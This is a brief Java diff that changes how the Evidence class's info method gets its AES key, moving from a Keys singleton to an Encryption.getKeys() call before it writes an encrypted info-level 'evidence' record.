@@ -605,8 +605,7 @@ public final class Evidence {
 
     public static void info(final String message) {
         try {
-            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false, Keys
-                    .getInstance().getAesKey());
+            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false, Encryption.getKeys().getAesKey());
 
             logInfo.createEvidence(null);
             logInfo.writeEvidence(message, true);
